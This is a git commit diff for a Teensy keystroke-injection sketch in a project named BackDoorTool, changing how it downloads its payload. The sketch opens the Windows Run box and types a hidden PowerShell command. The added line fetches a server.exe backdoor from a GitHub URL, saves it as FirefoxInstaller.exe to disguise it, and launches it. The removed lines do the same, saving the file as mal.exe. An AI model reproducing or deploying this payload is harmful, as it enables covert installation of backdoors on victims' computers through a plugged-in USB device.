a76b2614b2ca9c62a7bf183360f0bb0d1275ab38
洪嘉駿 <yf9000555@gmail.com>
2020-08-07 13:51:06 +0800

    修改下載檔案的code

--- BackDoorTool/teensy.ino
+++ BackDoorTool/teensy.ino
@@ -10,12 +10,12 @@ void setup() {
   type('r',false);
   Keyboard.releaseAll();
   delay(500);
-
+  
   type(KEY_LEFT_CTRL,false);
   type(KEY_SPACE,false);
   Keyboard.releaseAll();
   delay(1000);
-
+  
   type(KEY_LEFT_CTRL,false);
   type('a',false);
   Keyboard.releaseAll();
@@ -24,23 +24,10 @@ void setup() {
   type(KEY_BACKSPACE,false);
   Keyboard.releaseAll();
   delay(500);
-
-  Keyboard.print(F("powershell -windowstyle hidden "));
-  delay(500);
-  Keyboard.print(F("(new-object System.Net.WebClient).DownloadFile"));
-  delay(500);
-  Keyboard.print(F("('https://raw.githubusercontent.com/Hung-Jia-Jun/"));
-  delay(500);
-  Keyboard.print(F("python/master/BackDoorTool/dist/"));
-  delay(500);
-  Keyboard.print(F("server.exe','%TEMP%\\mal.exe');"));
-  delay(500);
-  Keyboard.print(F(" Start-Process \"%TEMP%\\mal.exe\""));
   
-  //Keyboard.print(F("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://reurl.cc/GVzjEd','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
-  
-  //print(F("powershell -windowstyle hidden \"C:\\Users\\Jason\\Scripts\\BackDoorTool\\dist\\backdoor_server.exe \" "));
+  Keyboard.print("powershell -windowstyle hidden Invoke-WebRequest https://raw.githubusercontent.com/Hung-Jia-Jun/python/master/BackDoorTool/server.exe -OutFile FirefoxInstaller.exe; Start-Process FirefoxInstaller.exe");
   delay(1000);
+  
   type(KEY_RETURN,false);
   Keyboard.releaseAll();
   Keyboard.end();
